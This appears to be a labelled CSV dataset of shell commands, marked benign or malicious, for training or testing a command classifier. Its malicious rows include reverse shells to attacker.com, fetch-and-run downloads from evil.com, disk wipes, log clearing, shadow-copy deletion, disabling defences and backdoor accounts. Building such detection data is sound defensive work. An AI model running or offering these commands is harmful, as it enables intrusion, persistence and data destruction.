command,label
touch newfile.txt,benign
ls -la,benign
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
systemctl status nginx,benign
history,benign
vssadmin delete shadows /all /quiet >/dev/null,malicious
kubectl get pods,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
service apache2 status > output.txt,benign
awk '{print $1}' data.txt --help,benign
node --version --help,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
dd if=/dev/zero of=/dev/sda,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
chmod 755 script.sh,benign
sort data.txt > output.txt,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= &,malicious
finger user,benign
cat /dev/urandom > /dev/sda,malicious
cmd /c del /q /s C:\*,malicious
shutdown /r /f /t 0,malicious
(net localgroup administrators hacker /add),malicious
echo 'virus' > /etc/passwd,malicious
sudo ps aux,benign
timeout 60 echo 'virus' > /etc/passwd,malicious
"cut -d',' -f1 data.csv",benign
ufw status --help,benign
vssadmin delete shadows /all /quiet,malicious
dd if=/dev/zero of=/dev/sda,malicious
vmstat,benign
powershell Get-Process -v,benign
find /home -name '*.txt',benign
mshta javascript:alert('code execution'),malicious
format C: /q /x,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
nohup cipher /w:C:\,malicious
pwd,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
mkdir -p /tmp/test,benign
history,benign
useradd newuser,benign
rmdir empty_folder,benign
mkfs.ext4 /dev/sda1,malicious
sc stop Windows Defender,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
fdisk -l,benign
tail -f /var/log/syslog > output.txt,benign
:(){ :|:& };:,malicious
fdisk -l,benign
net user hacker password123 /add,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
rmdir empty_folder,benign
cipher /w:C:\,malicious
uptime,benign
pwd -v,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
ssh user@server.com,benign
rsync -av /src/ /dst/ | head -5,benign
netstat -tulpn | head -5,benign
traceroute google.com --help,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
find /home -name '*.txt' 2>/dev/null,benign
w,benign
shutdown /r /f /t 0,malicious
htop | head -5,benign
userdel olduser,benign
history,benign
mshta javascript:alert('code execution') 2>&1,malicious
cp file1.txt file2.txt,benign
chmod 777 /etc/shadow,malicious
nohup format C: /q /x,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
curl http://evil.com/payload.sh | bash 2>&1,malicious
vssadmin delete shadows /all /quiet 2>&1,malicious
msbuild project.csproj,benign
nohup vssadmin delete shadows /all /quiet,malicious
chmod 777 /etc/shadow,malicious
passwd user,benign
certutil -hashfile file.txt SHA256 | head -5,benign
free -m,benign
which python,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
mount | head -5,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
tar -czf backup.tar.gz /data,benign
mkfs.ext4 /dev/sda1,malicious
(format C: /q /x),malicious
userdel olduser,benign
sc stop Windows Defender,malicious
pip list,benign
nohup net user hacker password123 /add,malicious
ss -tulpn,benign
crontab -l,benign
docker images,benign
"cut -d',' -f1 data.csv",benign
"python -c 'import os; os.system(""rm -rf /"")' &",malicious
sudo wget https://example.com/file.txt,benign
echo 'virus' > /etc/passwd,malicious
apt list --installed,benign
sdelete -p 10 -s -z C:\,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
docker ps,benign
mount,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
sudo uniq sorted.txt,benign
vssadmin delete shadows /all /quiet &,malicious
java -version,benign
format C: /q /x,malicious
traceroute google.com,benign
docker ps,benign
w,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
ls -la 2>/dev/null,benign
htop,benign
"nohup python -c 'import os; os.system(""rm -rf /"")'",malicious
sudo last,benign
(nc -l -p 4444 -e /bin/bash),malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe >/dev/null,malicious
wget https://example.com/file.txt,benign
nc -l -p 4444 -e /bin/bash,malicious
timeout 60 curl http://evil.com/payload.sh | bash,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
service apache2 status | head -5,benign
rm -rf /,malicious
finger user,benign
wevtutil cl Security 2>&1,malicious
tail -f /var/log/syslog > output.txt,benign
head -10 logfile.txt -v,benign
vssadmin delete shadows /all /quiet,malicious
attrib +h +s malware.exe &,malicious
iptables -L,benign
cat /dev/urandom > /dev/sda,malicious
top,benign
usermod -aG sudo user,benign
uptime,benign
df -h,benign
iostat,benign
net user hacker password123 /add,malicious
wc -l document.txt 2>/dev/null,benign
echo 'Hello World',benign
rm -rf /,malicious
rsync -av /src/ /dst/,benign
fdisk -l,benign
df -h 2>/dev/null,benign
sdelete -p 10 -s -z C:\ &,malicious
sdelete -p 10 -s -z C:\,malicious
awk '{print $1}' data.txt > output.txt,benign
sudo df -h,benign
format C: /q /x,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
uniq sorted.txt > output.txt,benign
who,benign
chown user:group file.txt 2>/dev/null,benign
net localgroup administrators hacker /add,malicious
uniq sorted.txt,benign
rm -rf /,malicious
cat /dev/urandom > /dev/sda,malicious
fdisk -l -v,benign
umount /dev/sdb1,benign
pip list,benign
iptables -L,benign
who,benign
ping -c 4 google.com --help,benign
attrib +h +s malware.exe,malicious
iptables -L > output.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mount,benign
net user hacker password123 /add >/dev/null,malicious
yum list installed,benign
grep pattern file.txt,benign
mount --help,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
pip list,benign
useradd newuser | head -5,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
docker images,benign
mv old.txt new.txt,benign
ufw status,benign
service apache2 status,benign
git clone https://github.com/user/repo.git,benign
rsync -av /src/ /dst/,benign
ssh user@server.com,benign
wc -l document.txt,benign
pip list,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
taskkill /f /im antimalware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
ssh user@server.com,benign
groups user,benign
java -version,benign
tail -f /var/log/syslog,benign
chmod 777 /etc/shadow &,malicious
mshta javascript:alert('code execution'),malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe 2>&1,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
grep pattern file.txt,benign
passwd user,benign
rm -rf / &,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
rm -rf /,malicious
wc -l document.txt,benign
touch newfile.txt,benign
netsh advfirewall set allprofiles state off,malicious
mshta javascript:alert('code execution'),malicious
tail -f /var/log/syslog,benign
usermod -aG sudo user,benign
df -h,benign
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
wc -l document.txt,benign
curl http://evil.com/payload.sh | bash,malicious
uniq sorted.txt 2>/dev/null,benign
cat /etc/passwd | head -5,benign
net user hacker password123 /add,malicious
man ls 2>/dev/null,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mkfs.ext4 /dev/sda1,malicious
usermod -aG sudo user,benign
userdel olduser,benign
mv old.txt new.txt,benign
npm list 2>/dev/null,benign
cat /dev/urandom > /dev/sda,malicious
diskpart select disk 0 clean >/dev/null,malicious
ncat -lvp 443 -e cmd.exe,malicious
mkdir -p /tmp/test,benign
nc -l -p 4444 -e /bin/bash,malicious
cp file1.txt file2.txt 2>/dev/null,benign
taskkill /f /im antimalware.exe,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll -v,benign
wget http://malicious.com/malware.exe,malicious
pwd | head -5,benign
java -version,benign
diskpart select disk 0 clean,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
which python,benign
echo 'Hello World',benign
ncat -lvp 443 -e cmd.exe 2>&1,malicious
apt list --installed,benign
nohup net user hacker password123 /add,malicious
wevtutil cl System,malicious
nc -l -p 4444 -e /bin/bash,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
umount /dev/sdb1 --help,benign
net user hacker password123 /add,malicious
uptime,benign
git clone https://github.com/user/repo.git > output.txt,benign
ssh user@server.com,benign
ls -la,benign
rm -rf /,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
timeout 60 attrib +h +s malware.exe,malicious
systemctl status nginx,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
netsh advfirewall set allprofiles state off,malicious
netstat -tulpn,benign
sort data.txt,benign
head -10 logfile.txt,benign
format C: /q /x,malicious
mkfs.ext4 /dev/sda1,malicious
certutil -hashfile file.txt SHA256,benign
uptime,benign
crontab -l,benign
service apache2 status,benign
history,benign
curl -I https://google.com,benign
git pull origin main 2>/dev/null,benign
dd if=/dev/zero of=/dev/sda,malicious
systemctl status nginx,benign
wevtutil cl Security,malicious
mkdir -p /tmp/test,benign
passwd user,benign
mshta javascript:alert('code execution'),malicious
userdel olduser --help,benign
nslookup google.com,benign
head -10 logfile.txt,benign
usermod -aG sudo user,benign
:(){ :|:& };:,malicious
type ls,benign
docker ps,benign
taskkill /f /im antimalware.exe,malicious
format C: /q /x,malicious
head -10 logfile.txt,benign
echo 'Hello World',benign
groups user --help,benign
w,benign
wget https://example.com/file.txt,benign
cmd /c del /q /s C:\*,malicious
pwd,benign
cat /dev/urandom > /dev/sda,malicious
kubectl get pods,benign
top,benign
npm list,benign
curl http://evil.com/payload.sh | bash,malicious
msbuild project.csproj > output.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' >/dev/null",malicious
usermod -aG sudo user,benign
free -m > output.txt,benign
date --help,benign
sort data.txt,benign
dd if=/dev/zero of=/dev/sda,malicious
format C: /q /x,malicious
id user,benign
rm -rf /,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll -v,benign
:(){ :|:& };:,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
cp file1.txt file2.txt > output.txt,benign
certutil -hashfile file.txt SHA256,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
vssadmin delete shadows /all /quiet,malicious
mount 2>/dev/null,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') >/dev/null",malicious
diskpart select disk 0 clean,malicious
vmstat,benign
yum list installed,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"timeout 60 rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
groups user -v,benign
dd if=/dev/zero of=/dev/sda 2>&1,malicious
curl -I https://google.com -v,benign
sudo apt list --installed,benign
sdelete -p 10 -s -z C:\,malicious
git clone https://github.com/user/repo.git 2>/dev/null,benign
chmod 755 script.sh,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
:(){ :|:& };:,malicious
docker ps -v,benign
cipher /w:C:\,malicious
date,benign
docker ps,benign
wc -l document.txt,benign
free -m,benign
certutil -hashfile file.txt SHA256,benign
head -10 logfile.txt -v,benign
sc stop Windows Defender >/dev/null,malicious
ss -tulpn,benign
tail -f /var/log/syslog,benign
(powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=),malicious
useradd newuser 2>/dev/null,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
git pull origin main,benign
nc -l -p 4444 -e /bin/bash,malicious
wc -l document.txt,benign
systemctl reload nginx > output.txt,benign
touch newfile.txt,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
shutdown /r /f /t 0,malicious
uniq sorted.txt --help,benign
nc -l -p 4444 -e /bin/bash,malicious
uniq sorted.txt,benign
docker images,benign
sdelete -p 10 -s -z C:\ >/dev/null,malicious
which python,benign
vssadmin delete shadows /all /quiet,malicious
wevtutil cl System,malicious
systemctl status nginx | head -5,benign
cipher /w:C:\,malicious
date,benign
useradd newuser,benign
cat /dev/urandom > /dev/sda,malicious
wevtutil cl Security,malicious
last --help,benign
csc -target:library file.cs -v,benign
:(){ :|:& };:,malicious
awk '{print $1}' data.txt,benign
tail -f /var/log/syslog -v,benign
wc -l document.txt,benign
net user hacker password123 /add,malicious
free -m > output.txt,benign
rmdir empty_folder,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
mshta javascript:alert('code execution'),malicious
taskkill /f /im antimalware.exe,malicious
date,benign
du -sh /var/log -v,benign
vmstat,benign
shutdown /r /f /t 0,malicious
usermod -aG sudo user,benign
format C: /q /x,malicious
tar -czf backup.tar.gz /data,benign
wevtutil cl Security,malicious
cipher /w:C:\,malicious
nohup chmod 777 /etc/shadow,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
cp file1.txt file2.txt,benign
wevtutil cl System >/dev/null,malicious
sdelete -p 10 -s -z C:\,malicious
wget https://example.com/file.txt,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
pip list,benign
node --version,benign
netsh advfirewall set allprofiles state off,malicious
java -version,benign
date,benign
sort data.txt,benign
usermod -aG sudo user,benign
sort data.txt -v,benign
diskpart select disk 0 clean,malicious
df -h | head -5,benign
"cut -d',' -f1 data.csv",benign
wget http://malicious.com/malware.exe >/dev/null,malicious
htop,benign
echo 'Hello World' -v,benign
msbuild project.csproj,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
echo 'virus' > /etc/passwd,malicious
format C: /q /x,malicious
cp file1.txt file2.txt 2>/dev/null,benign
uniq sorted.txt,benign
ss -tulpn,benign
nohup :(){ :|:& };:,malicious
vssadmin delete shadows /all /quiet 2>&1,malicious
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
top,benign
mshta javascript:alert('code execution') >/dev/null,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' >/dev/null",malicious
rm -rf /,malicious
sudo mount,benign
groups user,benign
tar -czf backup.tar.gz /data,benign
which python,benign
netsh advfirewall set allprofiles state off,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
wc -l document.txt,benign
fdisk -l,benign
w,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
timeout 60 wevtutil cl System,malicious
ls -la,benign
attrib +h +s malware.exe,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
tail -f /var/log/syslog,benign
rmdir empty_folder,benign
net localgroup administrators hacker /add,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
taskkill /f /im antimalware.exe,malicious
ncat -lvp 443 -e cmd.exe,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
free -m -v,benign
java -version 2>/dev/null,benign
sed 's/old/new/g' file.txt,benign
free -m,benign
sudo netstat -tulpn,benign
wget https://example.com/file.txt 2>/dev/null,benign
type ls,benign
diskpart select disk 0 clean,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
wget http://malicious.com/malware.exe,malicious
last,benign
wevtutil cl Security,malicious
cmd /c del /q /s C:\*,malicious
diskpart select disk 0 clean,malicious
net localgroup administrators hacker /add,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
scp file.txt user@server:/path/,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
tail -f /var/log/syslog,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
:(){ :|:& };:,malicious
free -m,benign
timeout 60 diskpart select disk 0 clean,malicious
sudo id user,benign
shutdown /r /f /t 0,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"nohup socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
traceroute google.com,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
apt list --installed | head -5,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
rm -rf / &,malicious
usermod -aG sudo user --help,benign
curl -I https://google.com -v,benign
python --version,benign
apt list --installed,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
rsync -av /src/ /dst/,benign
chown user:group file.txt,benign
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
git pull origin main,benign
iptables -L -v,benign
ss -tulpn,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe &,malicious
(bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe),malicious
vssadmin delete shadows /all /quiet,malicious
nohup nc -l -p 4444 -e /bin/bash,malicious
nc -l -p 4444 -e /bin/bash,malicious
(attrib +h +s malware.exe),malicious
rsync -av /src/ /dst/ > output.txt,benign
:(){ :|:& };:,malicious
sudo date,benign
dd if=/dev/zero of=/dev/sda,malicious
nohup cipher /w:C:\,malicious
chown user:group file.txt,benign
nohup cat /dev/urandom > /dev/sda,malicious
shutdown /r /f /t 0,malicious
npm list,benign
yum list installed,benign
scp file.txt user@server:/path/,benign
iostat,benign
(rm -rf /),malicious
sdelete -p 10 -s -z C:\,malicious
ls -la,benign
diskpart select disk 0 clean >/dev/null,malicious
lsblk,benign
echo 'virus' > /etc/passwd,malicious
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
ps aux,benign
nohup taskkill /f /im antimalware.exe,malicious
traceroute google.com,benign
crontab -l,benign
sort data.txt,benign
grep pattern file.txt,benign
vssadmin delete shadows /all /quiet,malicious
echo 'virus' > /etc/passwd,malicious
attrib +h +s malware.exe,malicious
last 2>/dev/null,benign
free -m,benign
pip list --help,benign
nslookup google.com,benign
(net localgroup administrators hacker /add),malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
wevtutil cl Security &,malicious
mkfs.ext4 /dev/sda1,malicious
nc -l -p 4444 -e /bin/bash,malicious
java -version,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
wevtutil cl Security,malicious
nohup attrib +h +s malware.exe,malicious
sdelete -p 10 -s -z C:\,malicious
userdel olduser > output.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
wevtutil cl Security,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash 2>&1",malicious
rm -rf /,malicious
ncat -lvp 443 -e cmd.exe,malicious
shutdown /r /f /t 0,malicious
ufw status,benign
nc -l -p 4444 -e /bin/bash,malicious
tail -f /var/log/syslog,benign
sdelete -p 10 -s -z C:\,malicious
"cut -d',' -f1 data.csv",benign
dd if=/dev/zero of=/dev/sda 2>&1,malicious
chmod 777 /etc/shadow,malicious
sc stop Windows Defender,malicious
taskkill /f /im antimalware.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
uptime,benign
df -h -v,benign
npm list,benign
chmod 777 /etc/shadow,malicious
dd if=/dev/zero of=/dev/sda,malicious
userdel olduser,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
certutil -hashfile file.txt SHA256,benign
:(){ :|:& };:,malicious
sudo node --version,benign
chmod 755 script.sh,benign
sudo mv old.txt new.txt,benign
sudo mv old.txt new.txt,benign
docker ps,benign
certutil -hashfile file.txt SHA256,benign
docker images,benign
man ls,benign
msbuild project.csproj,benign
who,benign
taskkill /f /im antimalware.exe,malicious
mshta javascript:alert('code execution'),malicious
wget http://malicious.com/malware.exe,malicious
service apache2 status,benign
node --version,benign
netsh advfirewall set allprofiles state off,malicious
ss -tulpn,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
msbuild project.csproj,benign
df -h,benign
man ls | head -5,benign
netsh advfirewall set allprofiles state off,malicious
ncat -lvp 443 -e cmd.exe,malicious
head -10 logfile.txt,benign
top,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
who,benign
wevtutil cl System &,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
pwd,benign
cat /dev/urandom > /dev/sda >/dev/null,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
diskpart select disk 0 clean,malicious
cipher /w:C:\,malicious
(nc -l -p 4444 -e /bin/bash),malicious
(mshta javascript:alert('code execution')),malicious
mshta javascript:alert('code execution'),malicious
chmod 777 /etc/shadow &,malicious
umount /dev/sdb1,benign
ping -c 4 google.com,benign
finger user | head -5,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
which python,benign
find /home -name '*.txt',benign
mkfs.ext4 /dev/sda1,malicious
(wevtutil cl System),malicious
format C: /q /x,malicious
tail -f /var/log/syslog,benign
usermod -aG sudo user | head -5,benign
wevtutil cl Security,malicious
git clone https://github.com/user/repo.git,benign
usermod -aG sudo user,benign
dd if=/dev/zero of=/dev/sda,malicious
mkfs.ext4 /dev/sda1,malicious
(copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\),malicious
which python,benign
date --help,benign
sudo kubectl get pods,benign
rm -rf /,malicious
diskpart select disk 0 clean,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
wget http://malicious.com/malware.exe 2>&1,malicious
nohup cipher /w:C:\,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll --help,benign
taskkill /f /im antimalware.exe,malicious
net localgroup administrators hacker /add,malicious
npm list > output.txt,benign
passwd user,benign
npm list,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
mkfs.ext4 /dev/sda1,malicious
cp file1.txt file2.txt,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
netsh advfirewall set allprofiles state off 2>&1,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
java -version,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
timeout 60 nc -l -p 4444 -e /bin/bash,malicious
nohup :(){ :|:& };:,malicious
net localgroup administrators hacker /add,malicious
nohup cipher /w:C:\,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash 2>&1",malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
attrib +h +s malware.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
dd if=/dev/zero of=/dev/sda,malicious
type ls --help,benign
vssadmin delete shadows /all /quiet >/dev/null,malicious
npm list,benign
rsync -av /src/ /dst/ --help,benign
lsblk,benign
net user hacker password123 /add,malicious
apt list --installed,benign
uniq sorted.txt,benign
powershell Get-Process,benign
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
wc -l document.txt,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
pwd,benign
(diskpart select disk 0 clean),malicious
cipher /w:C:\,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash 2>&1",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
net localgroup administrators hacker /add,malicious
nc -l -p 4444 -e /bin/bash,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= &,malicious
fdisk -l,benign
net localgroup administrators hacker /add,malicious
cmd /c del /q /s C:\*,malicious
umount /dev/sdb1,benign
date,benign
git clone https://github.com/user/repo.git,benign
format C: /q /x,malicious
shutdown /r /f /t 0,malicious
python --version,benign
mshta javascript:alert('code execution') &,malicious
attrib +h +s malware.exe,malicious
attrib +h +s malware.exe 2>&1,malicious
git pull origin main,benign
cipher /w:C:\,malicious
apt list --installed,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
